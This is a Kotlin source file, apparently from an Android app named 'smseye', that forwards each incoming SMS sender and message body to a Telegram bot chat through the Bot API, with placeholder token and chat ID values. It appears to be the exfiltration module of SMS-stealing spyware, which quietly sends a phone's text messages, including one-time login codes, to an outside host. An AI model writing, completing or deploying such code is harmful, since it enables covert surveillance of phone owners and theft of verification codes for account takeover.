package com.example.smseye
import okhttp3.*
import java.io.IOException

object TelegramService {
    private val client = OkHttpClient()
    private const val BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
    private const val CHAT_ID = "YOUR_CHAT_ID_HERE"

    fun sendSms(sender: String, message: String) {
        val text = "New SMS from: $sender\nMessage: $message"
        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$text"
        
        val request = Request.Builder().url(url).build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) { e.printStackTrace() }
            override fun onResponse(call: Call, response: Response) { response.close() }
        })
    }
}
